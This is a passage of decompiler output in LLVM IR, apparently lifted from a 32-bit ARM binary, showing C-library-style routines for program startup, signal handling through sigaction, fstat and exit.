  %v17_14c20 = phi i32 [ %v3_14bfc, %dec_label_pc_14bf4 ], [ 0, %dec_label_pc_14c10 ], [ %v17_14c20.pre, %dec_label_pc_14b54 ], [ -1, %dec_label_pc_14c18 ]
  %v2_14c20 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14c20, i32* @r4, align 4
  store i32 %v6_14a84, i32* @r5, align 4
  store i32 %v9_14a84, i32* @r6, align 4
  ret i32 %v17_14c20

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_14b88, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_14b18, { 0, 2, 1 }
  uselistorder i32 %v2_14ad8, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_14ad0, { 1, 0, 2 }
  uselistorder i32 %v1_14aa4, { 0, 2, 1 }
  uselistorder i32 %v16_14a84, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 8, 9, 10, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 7, 6, 9, 8, 22, 10, 12, 13, 11, 15, 14, 16, 21, 17, 20, 18, 19, 0 }
  uselistorder i32 (i32, i32*, i32)* @function_14f80, { 1, 2, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @function_138d0, { 1, 2, 3, 4, 0 }
  uselistorder i32 ()* @function_140b8, { 2, 1, 0, 3, 4 }
  uselistorder i32 -136, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14c1c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_14c18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c10, { 1, 0 }
  uselistorder label %dec_label_pc_14bec, { 1, 0 }
  uselistorder label %dec_label_pc_14be0, { 1, 0 }
  uselistorder label %dec_label_pc_14b10, { 1, 0 }
  uselistorder label %dec_label_pc_14a9c, { 1, 0 }
}

define i32 @function_14c28(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c54:
  %stack_var_-8 = alloca i32, align 4
  %v3_14c28 = load i32, i32* @r4, align 4
  store i32 %v3_14c28, i32* %stack_var_-8, align 4
  %v2_14c58 = load i32, i32* @global_var_1ec64.662, align 4
  %v2_14c5c = icmp eq i32 %v2_14c58, 0
  br i1 %v2_14c5c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14c54
  call void @__pseudo_branch(i32 %v2_14c58)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14c54, %bb
  %v2_14c6c = load i32, i32* @global_var_1ec68.664, align 4
  %v2_14c70 = icmp eq i32 %v2_14c6c, 0
  br i1 %v2_14c70, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_14c74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_14c74, i32* @r4, align 4
  %v9_14c74 = load i32, i32* @r0, align 4
  ret i32 %v9_14c74

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_14c6c)
  %v2_14c80 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14c80, i32* @r4, align 4
  %v8_14c80 = load i32, i32* @r0, align 4
  ret i32 %v8_14c80

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_14c94() local_unnamed_addr {
dec_label_pc_14c94:
  ret i32 0
}

define i32 @function_14c9c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_14c9c:
  %v1_14c9c = load i32, i32* @r0, align 4
  ret i32 %v1_14c9c
}

define i32 @function_14ca0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14ca0:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14ca0 = load i32, i32* @r4, align 4
  store i32 %v3_14ca0, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_14cb0 = call i32 @function_13564(i32 %arg1, i32 1)
  %v7_14cb4 = icmp eq i32 %v2_14cb0, -1
  br i1 %v7_14cb4, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14ca0
  %v3_14cb8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_14cb8, i32* @r4, align 4
  ret i32 %v2_14cb0

bb4:                                              ; preds = %dec_label_pc_14ca0
  %v0_14cbc = load i32, i32* @r4, align 4
  %v4_14cc4 = call i32 @function_13780(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1671c.667, i32 0, i32 0), i32 %v0_14cbc)
  %v1_14cc8 = load i32, i32* %r5.global-to-local, align 4
  %v9_14cc8 = icmp eq i32 %v4_14cc4, %v1_14cc8
  br i1 %v9_14cc8, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_14ccc = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_14ccc, i32* @r4, align 4
  ret i32 %v4_14cc4

bb6:                                              ; preds = %bb4
  %v0_14cd0 = call i32 @function_146fc()
  %v0_14cd4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14cd4, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  %v2_14cd4 = load i32, i32* @ip, align 4
  %v3_14cd4 = load i32, i32* @r7, align 4
  %v8_14cd4 = shl i32 %v2_14cd4, %v3_14cd4
  %v9_14cd4 = and i32 %v8_14cd4, %v0_14cbc
  store i32 %v9_14cd4, i32* @r6, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_14cd0

; uselistorder directives
  uselistorder i32 %v2_14cb0, { 1, 0 }
  uselistorder i32* @r7, { 286, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 230, 231, 42, 50, 43, 1, 41, 57, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 58, 59, 232, 240, 241, 233, 234, 235, 236, 237, 238, 239, 66, 67, 2, 68, 69, 70, 71, 72, 73, 74, 75, 191, 192, 193, 60, 0, 61, 62, 63, 64, 65, 76, 77, 78, 79, 3, 80, 81, 82, 83, 84, 85, 86, 87, 88, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 4, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285 }
  uselistorder i1* @cpsr_z, { 8, 0, 1, 10, 9, 5, 6, 2, 3, 4, 7 }
  uselistorder i32 ()* @function_146fc, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @function_13780, { 9, 6, 0, 1, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 (i32, i32)* @function_13564, { 0, 11, 4, 3, 6, 5, 15, 14, 8, 7, 13, 12, 10, 9, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_14cd8(i32 %arg1) local_unnamed_addr {
dec_label_pc_14cd8:
  %v2_14cdc = load i32, i32* @global_var_1ec6c.669, align 4
  %v2_14ce0 = icmp eq i32 %v2_14cdc, 0
  br i1 %v2_14ce0, label %bb2, label %bb

bb:                                               ; preds = %dec_label_pc_14cd8
  %v6_14cec = load i32, i32* @r0, align 4
  ret i32 %v6_14cec

bb2:                                              ; preds = %dec_label_pc_14cd8
  store i32 1, i32* @global_var_1ec6c.669, align 4
  store i32 4096, i32* @global_var_1ec60.620, align 4
  ret i32 undef
}

define i32 @function_14d34(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_14d34:
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_14d38 = mul i32 %arg2, 4
  %v5_14d38 = add i32 %tmp, %v4_14d38
  %v2_14d3c = load i32, i32* %arg3, align 4
  %v2_14d40 = ptrtoint i32* %stack_var_-120 to i32
  %v1_14d44 = add i32 %v5_14d38, 4
  %v9_14d48 = icmp eq i32 %v1_14d44, %v2_14d3c
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg7, i32* @global_var_1ec58.674, align 4
  store i32 %v1_14d44, i32* @global_var_1ec5c.676, align 4
  store i32 %arg6, i32* @global_var_1ec68.664, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_14d48, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_14d34
  store i32 %v5_14d38, i32* @global_var_1ec5c.676, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_14d34, %bb
  %v2_14d88 = bitcast i32* %stack_var_-120 to i8*
  %v3_14d88 = call i32 @function_13c90(i8* %v2_14d88, i32 0)
  %storemerge.pre = load i32, i32* @global_var_1ec5c.676, align 4
  br label %dec_label_pc_14d98

dec_label_pc_14d98:                               ; preds = %dec_label_pc_14d98, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_14d98, %dec_label_pc_14d98 ]
  %v1_14d98 = inttoptr i32 %storemerge to i32*
  %v2_14d98 = load i32, i32* %v1_14d98, align 4
  %v4_14d98 = add i32 %storemerge, 4
  %v2_14d9c = icmp eq i32 %v2_14d98, 0
  br i1 %v2_14d9c, label %dec_label_pc_14da8, label %dec_label_pc_14d98

dec_label_pc_14da8:                               ; preds = %dec_label_pc_14d98
  store i32 %v4_14d98, i32* @r4, align 4
  %v1_14dc822 = inttoptr i32 %v4_14d98 to i32*
  %v2_14dc823 = load i32, i32* %v1_14dc822, align 4
  %v2_14dcc25 = icmp eq i32 %v2_14dc823, 0
  br i1 %v2_14dcc25, label %dec_label_pc_14dd4, label %dec_label_pc_14db0

dec_label_pc_14db0:                               ; preds = %dec_label_pc_14da8, %dec_label_pc_14dc8
  %v5_14db4 = phi i32 [ %v2_14dc8, %dec_label_pc_14dc8 ], [ %v2_14dc823, %dec_label_pc_14da8 ]
  %v2_14db0 = icmp ugt i32 %v5_14db4, 13
  %v7_14db0 = icmp eq i32 %v5_14db4, 14
  %v2_14db4 = xor i1 %v2_14db0, true
  %v3_14db4 = or i1 %v7_14db0, %v2_14db4
  br i1 %v3_14db4, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_14db0
  %v6_14db4 = and i32 %v5_14db4, 536870912
  %v7_14db4 = icmp ne i32 %v6_14db4, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_14db0, %bb42
  %v1_14dc0 = phi i1 [ %v2_14db0, %dec_label_pc_14db0 ], [ %v7_14db4, %bb42 ]
  %v2_14db8 = xor i1 %v1_14dc0, true
  %v3_14db8 = or i1 %v7_14db0, %v2_14db8
  br i1 %v3_14db8, label %bb44, label %dec_label_pc_14dc8

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_14dc8

dec_label_pc_14dc8:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_14db8, i32 ptrtoint (i32* @global_var_13c70.678 to i32))
  %v0_14dc4 = load i32, i32* @r4, align 4
  %v1_14dc4 = add i32 %v0_14dc4, 8
  store i32 %v1_14dc4, i32* @r4, align 4
  %v1_14dc8 = inttoptr i32 %v1_14dc4 to i32*
  %v2_14dc8 = load i32, i32* %v1_14dc8, align 4
  %v2_14dcc = icmp eq i32 %v2_14dc8, 0
  br i1 %v2_14dcc, label %dec_label_pc_14dd4, label %dec_label_pc_14db0

dec_label_pc_14dd4:                               ; preds = %dec_label_pc_14dc8, %dec_label_pc_14da8
  %v1_14dd8 = call i32 @function_15e2c(i32 %v2_14d40)
  store i32 %v1_14dd8, i32* @r0, align 4
  %v1_14ddc = call i32 @function_14cd8(i32 %v1_14dd8)
  store i32 %v1_14ddc, i32* @r0, align 4
  %v2_14de8 = icmp eq i32 %tmp37, 0
  br i1 %v2_14de8, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_14dd4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_14dd4, %bb45
  %v0_14df8 = phi i32 [ %tmp37, %dec_label_pc_14dd4 ], [ 4096, %bb45 ]
  %v3_14df0 = icmp eq i32 %tmp36, -1
  %v8_14df0 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_1ec60.620 to i32), i32* @r2, align 4
  store i32 %v0_14df8, i32* @global_var_1ec60.620, align 4
  br i1 %v3_14df0, label %dec_label_pc_14e00, label %dec_label_pc_14e28

dec_label_pc_14e00:                               ; preds = %bb46
  %v0_14e00 = call i32 @function_1538c()
  store i32 %v0_14e00, i32* @r0, align 4
  store i32 %v0_14e00, i32* @r4, align 4
  %v0_14e08 = call i32 @function_15334()
  %v0_14e0c = load i32, i32* @r4, align 4
  %v9_14e0c = icmp eq i32 %v0_14e0c, %v0_14e08
  br i1 %v9_14e0c, label %dec_label_pc_14e14, label %dec_label_pc_14e50

dec_label_pc_14e14:                               ; preds = %dec_label_pc_14e00
  %v1_14e14 = call i32 @function_15360(i32 %v0_14e08)
  store i32 %v1_14e14, i32* @r0, align 4
  store i32 %v1_14e14, i32* @r4, align 4
  %v0_14e1c = call i32 @function_15308()
  %v0_14e20 = load i32, i32* @r4, align 4
  %v9_14e20 = icmp eq i32 %v0_14e20, %v0_14e1c
  br i1 %v9_14e20, label %dec_label_pc_14e28, label %dec_label_pc_14e50

dec_label_pc_14e28:                               ; preds = %dec_label_pc_14e14, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_14df0, label %dec_label_pc_14ebc, label %dec_label_pc_14e34

dec_label_pc_14e34:                               ; preds = %dec_label_pc_14e28
  %v9_14e38 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_14e38, label %dec_label_pc_14e40, label %dec_label_pc_14e50

dec_label_pc_14e40:                               ; preds = %dec_label_pc_14e34
  br label %dec_label_pc_14e50

dec_label_pc_14e50:                               ; preds = %dec_label_pc_14e40, %dec_label_pc_14e34, %dec_label_pc_14e14, %dec_label_pc_14e00
  %v2_14e58 = call i32 @function_14ca0(i32 0, i32 32768)
  %v2_14e64 = call i32 @function_14ca0(i32 1, i32 32770)
  %v2_14e70 = call i32 @function_14ca0(i32 2, i32 32770)
  br label %dec_label_pc_14ebc

dec_label_pc_14ebc:                               ; preds = %dec_label_pc_14e50, %dec_label_pc_14e28
  %v0_14e80 = load i32, i32* @r6, align 4
  %v1_14e80 = inttoptr i32 %v0_14e80 to i32*
  %v2_14e80 = load i32, i32* %v1_14e80, align 4
  store i32 %v2_14e80, i32* @global_var_1eb98, align 4
  store i32 %arg5, i32* @global_var_1ec64.662, align 4
  %v2_14ebc = icmp eq i32 %arg4, 0
  br i1 %v2_14ebc, label %dec_label_pc_14ef8, label %bb47

bb47:                                             ; preds = %dec_label_pc_14ebc
  br label %dec_label_pc_14ef8

dec_label_pc_14ef8:                               ; preds = %dec_label_pc_14ebc, %bb47
  call void @__pseudo_branch(i32 %arg4)
  %v1_14f08 = call i32 @function_13c28()
  %v2_14f10 = inttoptr i32 %v1_14f08 to i32*
  store i32 0, i32* %v2_14f10, align 4
  %v0_14f3c = load i32, i32* %r8.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_14f48 = call i32 @function_149f0(i32 %v0_14f3c)
  ret i32 %v1_14f48

; uselistorder directives
  uselistorder i32 %v2_14dc8, { 1, 0 }
  uselistorder i32 %v1_14dc4, { 1, 0 }
  uselistorder i1 %v2_14db0, { 1, 0 }
  uselistorder i32 %v4_14d98, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @function_149f0, { 0, 7, 6, 4, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_14ca0, { 2, 1, 0 }
  uselistorder i32 32768, { 1, 2, 0 }
  uselistorder i32* @global_var_1ec60.620, { 1, 4, 0, 2, 3 }
  uselistorder i32 4096, { 0, 1, 5, 9, 3, 4, 6, 7, 2, 8, 10, 11 }
  uselistorder i32 536870912, { 1, 0, 2 }
  uselistorder i1 true, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 49, 9, 10, 11, 12, 13, 17, 18, 19, 76, 77, 78, 79, 68, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 20, 21, 96, 97, 98, 50, 67, 15, 16, 66, 14, 99, 33, 32, 55, 61, 56, 62, 53, 60, 54, 65, 100, 22, 101, 102, 23, 24, 25, 103, 69, 70, 26, 27, 104, 71, 72, 28, 29, 105, 73, 74, 30, 31, 52, 106, 107, 63, 108, 34, 57, 35, 36, 51, 37, 38, 39, 109, 110, 111, 112, 58, 113, 114, 115, 116, 117, 118, 119, 120, 44, 121, 45, 46, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 43, 136, 137, 138, 139, 140, 141, 42, 142, 48, 143, 59, 64, 47, 144, 40, 41, 75, 145 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_14ef8, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_14dc8, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_14db0, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @function_14f80(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14f80:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_14f80 = load i32, i32* @r4, align 4
  %v6_14f80 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_14f84 = icmp eq i32* %arg2, null
  %v2_14f88 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_14f84, label %dec_label_pc_14ff4, label %dec_label_pc_14f98

dec_label_pc_14f98:                               ; preds = %dec_label_pc_14f80
  %v2_14f9c = load i32, i32* %arg2, align 4
  %v4_14f9c = add i32 %tmp, 4
  store i32 %v4_14f9c, i32* @r1, align 4
  %v2_14fa0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_14fa0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_14f9c, i32* %stack_var_-156, align 4
  %v3_14fac = call i32 @function_13c70(i32 %v2_14fa0, i32 %v4_14f9c, i32 128)
  store i32 %v3_14fac, i32* %r0.global-to-local, align 4
  %v0_14fb0 = load i32, i32* @r4, align 4
  %v1_14fb0 = add i32 %v0_14fb0, 132
  %v2_14fb0 = inttoptr i32 %v1_14fb0 to i32*
  %v3_14fb0 = load i32, i32* %v2_14fb0, align 4
  %v1_14fb4 = and i32 %v3_14fb0, 67108864
  %v2_14fb4 = icmp eq i32 %v1_14fb4, 0
  br i1 %v2_14fb4, label %dec_label_pc_14fc8, label %bb

bb:                                               ; preds = %dec_label_pc_14f98
  br label %dec_label_pc_14fe4

dec_label_pc_14fc8:                               ; preds = %dec_label_pc_14f98
  %v1_14fd0 = and i32 %v3_14fb0, 4
  %v2_14fd0 = icmp eq i32 %v1_14fd0, 0
  br i1 %v2_14fd0, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_14fc8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_14fc8, %bb20
  br label %dec_label_pc_14fe4

dec_label_pc_14fe4:                               ; preds = %bb, %bb21
  %v2_14fe4 = icmp eq i32 %v0_14fb0, 0
  %v3_14fe8 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_14fe8 = select i1 %v2_14fe4, i32 0, i32 %v3_14fe8
  %v0_14ff4.pre = load i32, i32* @r5, align 4
  %v0_15004.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14ff4

dec_label_pc_14ff4:                               ; preds = %dec_label_pc_14fe4, %dec_label_pc_14f80
  %v0_15004 = phi i32 [ %arg1, %dec_label_pc_14f80 ], [ %v0_15004.pre, %dec_label_pc_14fe4 ]
  %v0_14ff4 = phi i32 [ %arg3, %dec_label_pc_14f80 ], [ %v0_14ff4.pre, %dec_label_pc_14fe4 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_14f80 ], [ %.v3_14fe8, %dec_label_pc_14fe4 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_14ff4 = icmp eq i32 %v0_14ff4, 0
  %.v2_14f88 = select i1 %v2_14ff4, i32 0, i32 %v2_14f88
  store i32 %.v2_14f88, i32* @r2, align 4
  store i32 %v0_15004, i32* %r0.global-to-local, align 4
  %v1_15008 = call i32 @function_1506c(i32 %v0_15004)
  store i32 %v1_15008, i32* %r0.global-to-local, align 4
  %v0_1500c = load i32, i32* @r5, align 4
  %v2_1500c = icmp eq i32 %v0_1500c, 0
  br i1 %v2_1500c, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_14ff4
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_14ff4, %bb25
  %v0_1501c.pr = phi i32 [ 0, %dec_label_pc_14ff4 ], [ 1, %bb25 ]
  %v1_15014 = icmp slt i32 %v1_15008, 0
  br i1 %v1_15014, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_15050

thread-pre-split:                                 ; preds = %bb26
  %v2_1501c = icmp eq i32 %v0_1501c.pr, 0
  store i32 %v1_15008, i32* @r4, align 4
  br i1 %v2_1501c, label %dec_label_pc_15050, label %dec_label_pc_15028

dec_label_pc_15028:                               ; preds = %thread-pre-split
  %v2_15028 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_1500c, i32* %r0.global-to-local, align 4
  %v2_15030 = inttoptr i32 %v0_1500c to i32*
  store i32 %v2_15028, i32* %v2_15030, align 4
  %v3_15030 = load i32, i32* %r0.global-to-local, align 4
  %v4_15030 = add i32 %v3_15030, 4
  store i32 %v4_15030, i32* @r0, align 4
  %v2_15034 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_15034, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v3_1503c = call i32 @function_13c70(i32 %v4_15030, i32 %v2_15034, i32 128)
  store i32 %v3_1503c, i32* %r0.global-to-local, align 4
  %v1_15044 = load i32, i32* @r5, align 4
  %v2_15044 = add i32 %v1_15044, 136
  %v3_15044 = inttoptr i32 %v2_15044 to i32*
  %v1_1504c = load i32, i32* @r5, align 4
  %v2_1504c = add i32 %v1_1504c, 132
  %v3_1504c = inttoptr i32 %v2_1504c to i32*
  %v0_15050.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15050

dec_label_pc_15050:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_15028
  %v0_15050 = phi i32 [ %v1_15008, %thread-pre-split ], [ %v0_15050.pre, %dec_label_pc_15028 ], [ %v1_15008, %thread-pre-split.thread ]
  store i32 %v0_15050, i32* %r0.global-to-local, align 4
  store i32 %v3_14f80, i32* @r4, align 4
  store i32 %v6_14f80, i32* @r5, align 4
  ret i32 %v0_15050

; uselistorder directives
  uselistorder i32 %v0_15050, { 1, 0 }
  uselistorder i32 %v0_1500c, { 1, 0, 2 }
  uselistorder i32 %v0_15004, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 6, 4, 5, 2, 7, 1, 0 }
  uselistorder label %dec_label_pc_15050, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_14fe4, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_1506c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1506c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1506c = load i32, i32* @r4, align 4
  store i32 %v3_1506c, i32* %stack_var_-8, align 4
  %v1_15070 = load i32, i32* @r1, align 4
  %v2_15070 = inttoptr i32 %v1_15070 to %sigaction*
  %v3_15070 = load i32, i32* @r2, align 4
  %v4_15070 = inttoptr i32 %v3_15070 to %sigaction*
  %v5_15070 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_15070, %sigaction* %v4_15070)
  store i32 %v5_15070, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_15070, -4095
  br i1 %tmp, label %dec_label_pc_15090, label %dec_label_pc_15080

dec_label_pc_15080:                               ; preds = %dec_label_pc_1506c
  %v0_15080 = call i32 @function_13c28()
  %v0_15084 = load i32, i32* %r4.global-to-local, align 4
  %v1_15084 = sub i32 0, %v0_15084
  %v2_15088 = inttoptr i32 %v0_15080 to i32*
  store i32 %v1_15084, i32* %v2_15088, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15090

dec_label_pc_15090:                               ; preds = %dec_label_pc_1506c, %dec_label_pc_15080
  %v0_15090 = phi i32 [ %v5_15070, %dec_label_pc_1506c ], [ -1, %dec_label_pc_15080 ]
  %v2_15094 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15094, i32* %r4.global-to-local, align 4
  ret i32 %v0_15090

; uselistorder directives
  uselistorder i32 %v5_15070, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15090, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_15098(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_15098:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_150c0() local_unnamed_addr {
dec_label_pc_150c0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %tmp4 = bitcast i32* %stack_var_-72 to %stat*
  %v0_150d0 = load i32, i32* @r0, align 4
  %v4_150d0 = call i32 @fstat(i32 %v0_150d0, %stat* %tmp4)
  store i32 %v4_150d0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_150d0, -4095
  br i1 %tmp, label %dec_label_pc_150f4, label %dec_label_pc_150e0

dec_label_pc_150e0:                               ; preds = %dec_label_pc_150c0
  %v0_150e0 = call i32 @function_13c28()
  %v0_150e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_150e4 = sub i32 0, %v0_150e4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_150ec = inttoptr i32 %v0_150e0 to i32*
  store i32 %v1_150e4, i32* %v2_150ec, align 4
  br label %dec_label_pc_15104

dec_label_pc_150f4:                               ; preds = %dec_label_pc_150c0
  %v2_150f4 = icmp eq i32 %v4_150d0, 0
  store i32 86276, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_150f4, i32 ptrtoint (i32* @global_var_157dc.694 to i32))
  br label %dec_label_pc_15104

dec_label_pc_15104:                               ; preds = %dec_label_pc_150e0, %dec_label_pc_150f4
  %v0_15104 = load i32, i32* %r4.global-to-local, align 4
  ret i32 %v0_15104

; uselistorder directives
  uselistorder i32 %v4_150d0, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 5, 16, 14, 15, 9, 10, 6, 2, 3, 4, 0, 1, 7, 8, 11, 12, 13 }
  uselistorder label %dec_label_pc_15104, { 1, 0 }
}

define i32 @function_15110(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15110:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %v6_15110 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15118 = call i32 @function_151a4()
  store i32 %v0_15118, i32* %r6.global-to-local, align 4
  %tmp8 = icmp slt i32 %v0_15118, 1
  br i1 %tmp8, label %dec_label_pc_1519c, label %dec_label_pc_15188.preheader

dec_label_pc_15188.preheader:                     ; preds = %dec_label_pc_15110
